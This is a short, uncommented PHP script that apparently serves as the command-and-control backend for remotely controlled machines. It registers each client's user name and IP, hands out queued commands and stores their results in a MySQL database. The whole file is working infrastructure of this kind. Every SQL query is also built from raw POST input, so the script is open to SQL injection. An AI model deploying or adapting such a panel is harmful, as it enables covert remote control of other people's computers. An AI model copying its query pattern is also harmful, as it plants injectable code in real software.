<?
function checkIsUsed($sql, $ID){
    $r = $sql->query("SELECT `id` FROM `tDB` WHERE `UID`='$ID'");
    if($r->fetch_assoc() == NULL){ return false;}else return true;
}

function reg($sql){
    $time = time();
    $UID = '';
    do{
        for($i = 0; $i < 16; $i++) $UID.=chr(rand(65,90));
    } while(checkIsUsed($sql, $UID));
    $PCU = $_POST['PCUser'];
    $IP  = $_SERVER['REMOTE_ADDR'];
    $sql->query("INSERT INTO `tDB` (`UID`, `PCUser`, `IP`, `FIRSTDATE`, `LASTUPSIGNAL`) VALUES ('$UID', '$PCU', '$IP', '$time', '$time')");
    echo "REGED:".$UID;
}

$sql = new mysqli("localhost", "root","","RCuDB");
if(!$sql->error){
    ob_start();
    $KEY = $_POST['KEY'];
    $r = $sql->query("SELECT `id`,`CMD` from `tDB` WHERE `UID`='$KEY'");
    if(($a = $r->fetch_assoc()) == NULL) reg($sql);
    else
    if($a['CMD'] != null)
		$cmd = $a['CMD'];
	else $cmd="NOCMD";
    echo "CMD:".$cmd.PHP_EOL;
    echo "TIME:".time().PHP_EOL;
    if(isset($_POST['CMDRes'])){
        $sql->query("UPDATE `tDB` SET `CMDRes`='".$_POST['CMDRes']."',`LASTUPSIGNAL`='".time()."', `CMD`=NULL WHERE `UID`='$KEY'");
        echo "UID:".$KEY.PHP_EOL;
        echo "SQLERROR:".$sql->error.PHP_EOL;
        echo "RES:".$_POST['CMDRes'].PHP_EOL;
    }
    ob_end_flush();

 }
?>
